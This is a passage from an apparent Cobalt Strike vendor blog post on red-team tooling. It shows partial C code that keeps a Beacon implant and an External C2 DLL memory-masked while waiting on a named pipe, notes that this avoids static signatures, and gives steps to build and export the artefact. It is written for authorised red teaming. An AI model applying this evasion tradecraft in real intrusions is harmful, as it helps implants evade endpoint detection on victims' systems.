`ExternalC2Sleep()` is called from within the Sleepmask’s `PivotSleep()` function shown below. This makes it possible to keep Beacon masked and continuously mask/unmask the External C2 DLL whilst it waits to receive data.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `void``PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {` |

|     |     |
| --- | --- |
| `2` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `3` |  |

|     |     |
| --- | --- |
| `4` | ```// Check whether the Beacon is an extc2-loader Beacon` |

|     |     |
| --- | --- |
| `5` | ```EXTC2_DLL_STATE externalC2Dll = GetExternalC2DllState(info, customUserData);` |

|     |     |
| --- | --- |
| `6` |  |

|     |     |
| --- | --- |
| `7` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `8` | ```else``if``(action == ACTION_PIPE_PEEK) {` |

|     |     |
| --- | --- |
| `9` | ```DWORD``dataAvailable = 0;` |

|     |     |
| --- | --- |
| `10` |  |

|     |     |
| --- | --- |
| `11` | ```// Wait for data to be available on our pipe.` |

|     |     |
| --- | --- |
| `12` | ```while``(TRUE) {` |

|     |     |
| --- | --- |
| `13` | ```if``(!PeekNamedPipe(pivotArguments.pipe, NULL, 0, NULL, &dataAvailable, NULL)) {` |

|     |     |
| --- | --- |
| `14` | ```break``;` |

|     |     |
| --- | --- |
| `15` | ```}` |

|     |     |
| --- | --- |
| `16` |  |

|     |     |
| --- | --- |
| `17` | ```if``(dataAvailable > 0) {` |

|     |     |
| --- | --- |
| `18` | ```break``;` |

|     |     |
| --- | --- |
| `19` | ```}` |

|     |     |
| --- | --- |
| `20` | `` |

|     |     |
| --- | --- |
| `21` | ```if``(externalC2Dll == EXTC2_DLL_INITIALIZED) {` |

|     |     |
| --- | --- |
| `22` | ```ExternalC2Sleep(info, customUserData);` |

|     |     |
| --- | --- |
| `23` | ```}` |

|     |     |
| --- | --- |
| `24` |  |

|     |     |
| --- | --- |
| `25` | ```/**` |

|     |     |
| --- | --- |
| `26` | ```* A small Sleep between checking the pipe for data` |

|     |     |
| --- | --- |
| `27` | ```* for default pivot Sleep and also gives the External C2` |

|     |     |
| --- | --- |
| `28` | ```* client time to process any requests after waking up.` |

|     |     |
| --- | --- |
| `29` | ```*/` |

|     |     |
| --- | --- |
| `30` | ```Sleep(500);` |

|     |     |
| --- | --- |
| `31` | ```}` |

|     |     |
| --- | --- |
| `32` | ```}` |

|     |     |
| --- | --- |
| `33` | ```return``;` |

|     |     |
| --- | --- |
| `34` | `}` |

After executing our payload, we can see in ProcessHacker that whilst our memory is `RWX` (it is an example), it has all been sufficiently masked to avoid simple static signatures.

_**Note:** As part of this example we have not discussed [masking the Sleepmask itself which is a common target for signatures](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm). However, it would be possible to replace the `ExternalC2Sleep()` function’s call to `Sleep()` with [Gargoyle](https://github.com/JLospinoso/gargoyle)/ [Foliage](https://github.com/realoriginal/foliage)/ [Ekko](https://github.com/Cracked5pider/Ekko)/ [Deep Sleep](https://github.com/thefLink/DeepSleep) etc as required._

![](https://www.cobaltstrike.com/app/uploads/2024/08/screenshot_process-hacker_beacon-extc2-dll-masked-1-1024x644.png)

_**Note:** You may also be wondering why the start of the hex dump of the two DLLs looks the same. This is because we used the same key to mask both DLLs (`sleepmaskinfo->maskKey`) and we’re seeing the masked DOS/PE header. The key passed to the Sleepmask is randomly generated which will likely be sufficient. However, it would also be trivial to use different keys._

## Conclusion

That brings us to the end of this post, we hope that this has demonstrated the power of the UDRL and the Sleepmask and their central role in Cobalt Strike’s evasion strategy. We also hope it has demonstrated why users should start to think of the UDRL and the Sleepmask together and ways in which they can interoperate to create more advanced capabilities.

The code shown here is now available in the UDRL-VS library in the Arsenal Kit. To try it out, simply open the solution and compile the Release build of both the extc2-loader and extc2-dll. You can then load the `./bin/extc2-loader/prepend-udrl.cna` script into the Cobalt Strike console and export an artefact.

![](https://www.cobaltstrike.com/app/uploads/2023/09/Cobalt-author-photo.png)

#### [Robert Bearsby](https://www.cobaltstrike.com/profile/robert-bearsby)

Senior Cybersecurity Researcher

[View Profile](https://www.cobaltstrike.com/profile/robert-bearsby)

RELATED PRODUCTS


- [Cobalt Strike](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data "Cobalt Strike")

TOPICS


- [Development](https://www.cobaltstrike.com/blog?_sft_cornerstone=development "Development")
- [Red Team](https://www.cobaltstrike.com/blog?_sft_cornerstone=red-team "Red Team")